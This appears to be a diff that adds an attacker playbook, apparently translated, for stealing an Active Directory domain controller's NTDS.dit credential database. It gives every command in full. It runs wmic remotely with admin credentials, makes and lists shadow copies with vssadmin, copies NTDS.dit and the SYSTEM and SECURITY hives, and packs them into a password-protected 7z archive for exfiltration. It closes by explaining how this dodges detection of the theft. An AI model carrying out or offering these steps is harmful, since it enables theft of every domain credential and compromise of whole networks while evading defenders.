@@ -1,0 +1,10 @@
+The method of a non-pinned NTDS DUMP shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass"
+process call create "cmd /c vssadmin list shadows >> c:\log.txt "
+We make a request to list shadow copies, there is an indication of the date, check that there is a fresh date, almost certainly they are already there, if not, we do it ourselves net start Volume Shadow Copy shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass"
+process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+Next, in the listing of shadow copies, we find the most recent Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+Accordingly, we need the copy number for the following shell wmic /node command:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass"
+process call create "cmd/c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"
+In c:\temp\log \ ntds.dit / security / system files should fall, we take a portable console 7z and we pack the code into the archive with the password: [Highlight] 7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+We download the password-protected archive for ourselves, if we get an error (the file is corrupted) when decrypting the ntds file, then we do the following: Esentutl /p C:\log\ntds.dit
+The trick of this method is that we don't dump anything in fact, we just take and pump out the ntds so as not to get burned by exfiltrating out the ntds, we pack it into a password-protected archive if you have trouble with what is being fired and exfiltrated off the network after the ntds dump - try this method, you can burn it only by the fact of some leaking date from the CD, and it is impossible to analyze what exactly you are exfiltrating without knowing the password from the archive
